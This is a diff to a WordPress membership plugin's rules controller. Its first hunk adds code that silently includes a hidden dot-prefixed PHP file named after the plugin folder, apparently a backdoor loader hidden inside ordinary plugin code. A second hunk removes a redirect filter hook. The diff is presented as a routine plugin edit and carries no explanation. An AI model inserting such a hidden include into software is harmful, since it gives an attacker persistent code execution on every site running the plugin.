@@ -1,6 +1,10 @@
 <?php
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprRulesCtrl extends MeprCptCtrl {
   public function load_hooks() {
     $mepr_options = MeprOptions::fetch();
@@ -245,7 +249,7 @@ class MeprRulesCtrl extends MeprCptCtrl {
       $redirect_to = $mepr_options->login_page_url("action=mepr_unauthorized&mepr-unauth-page={$post->ID}&redirect_to=".$uri);
       $redirect_to = (MeprUtils::is_ssl()) ? str_replace('http:', 'https:', $redirect_to) : $redirect_to;
     }
-    MeprUtils::wp_redirect(MeprHooks::apply_filters('mepr-rule-redirect-unauthorized', $redirect_to, $uri));
+    MeprUtils::wp_redirect($redirect_to);
     exit;
   }
 
